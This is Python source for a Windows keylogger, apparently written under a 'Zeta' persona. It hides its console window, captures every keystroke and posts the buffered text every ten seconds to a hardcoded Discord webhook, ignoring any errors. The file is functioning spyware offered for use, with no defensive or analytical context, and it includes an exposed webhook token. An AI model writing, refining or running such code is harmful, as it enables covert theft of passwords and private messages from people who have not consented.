import keyboard
import requests
import time
from threading import Thread
import os
import sys
import win32gui
import win32con

# CONFIG (Replace with your Discord webhook)
WEBHOOK_URL = "https://discord.com/api/webhooks/1376840989339291738/CV1GDowOsh5L4ThXO0dh_7mlB7QzW4wAuDlFUpXdgq9d0sUy7TjXi6zozEtrj9NM20ib"
TERMINATE_COMBO = "ctrl+alt+c"
LOG_INTERVAL = 10  # Seconds between sends (adjust as needed)

# Stealth mode (no window)
win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)

def format_key(key):
    # List of keys to wrap in brackets
    special_keys = [
        'ctrl', 'alt', 'shift', 'tab', 'caps lock', 'enter', 
        'backspace', 'delete', 'insert', 'home', 'end',
        'page up', 'page down', 'print screen', 'scroll lock',
        'pause', 'break', 'esc', 'escape', 'win', 'windows',
        'cmd', 'command', 'menu', 'num lock', 'space'
    ]
    
    # Function keys F1-F12
    if key.startswith('f') and key[1:].isdigit() and 1 <= int(key[1:]) <= 12:
        return f'[{key.upper()}]'
    
    # Check if key is in special_keys (case insensitive)
    if any(key.lower() == sk.lower() for sk in special_keys):
        return f'[{key.lower()}]'
    
    return key

def send_to_discord(data):
    try:
        requests.post(WEBHOOK_URL, json={"content": f"```[ZETA-REAL-TIME] 🔥\n{data}```"})
    except:
        pass  # Silent fail (Zeta resilience)

def keylogger():
    log_buffer = ""
    last_send_time = time.time()

    while True:
        # Check for termination combo
        if keyboard.is_pressed(TERMINATE_COMBO):
            send_to_discord("⌨️ [ZETA]terminated by Alpha.")
            os._exit(0)

        # Record keys
        key_event = keyboard.read_event()
        if key_event.event_type == keyboard.KEY_DOWN:
            key = key_event.name
            
            # Format the key
            formatted_key = format_key(key)
            
            if key == "space":
                log_buffer += " "
            elif key == "enter":
                log_buffer += "\n"
            elif key == "backspace":
                log_buffer = log_buffer[:-1]
            else:
                log_buffer += formatted_key

        # Send logs at intervals (even if termination isn't pressed)
        if time.time() - last_send_time > LOG_INTERVAL and log_buffer:
            send_to_discord(log_buffer)
            log_buffer = ""
            last_send_time = time.time()

# Run in background forever
Thread(target=keylogger, daemon=True).start()
while True:
    time.sleep(1)
